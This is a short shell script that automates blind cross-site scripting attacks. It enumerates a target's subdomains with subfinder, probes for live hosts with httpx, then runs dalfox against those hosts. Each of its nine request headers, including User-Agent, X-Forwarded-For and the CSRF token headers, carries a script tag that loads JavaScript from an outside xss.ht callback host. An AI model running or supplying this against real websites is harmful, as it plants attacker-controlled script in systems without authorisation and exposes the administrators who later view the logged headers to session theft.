#!/bin/sh
docker pull projectdiscovery/httpx
docker pull projectdiscovery/subfinder
docker pull secsi/dalfox
alias dalfox='docker run -it --rm -w /data -v $(pwd):/data secsi/dalfox'
alias subfinder='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/subfinder'
alias httpx='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/httpx'

subfinder $1 >> $1subdomain.txt
httpx -list $1subdomain.txt >> live$1


dalfox file live$1  --header  'User-Agent: ><script src=https://husseinphp23.xss.ht></script>' --header  'X-Client-ip: ><script src=https://husseinphp23.xss.ht></script>' --header  'X-real-ip: ><script src=https://husseinphp23.xss.ht></script>'--header  'X-request-uri: ><script src=https://husseinphp23.xss.ht></script>' \  --header  'X-XSRF-TOKEN: ><script src=https://husseinphp23.xss.ht></script>' --header  'X-CSRF-TOKEN: ><script src=https://husseinphp23.xss.ht></script>' --header  'X-Forwarded-for: ><script src=https://husseinphp23.xss.ht></script>' --header  'X-forwarded-ip: ><script src=https://husseinphp23.xss.ht></script>' --header  'cf-connecting-ip: ><script src=https://husseinphp23.xss.ht></script>'
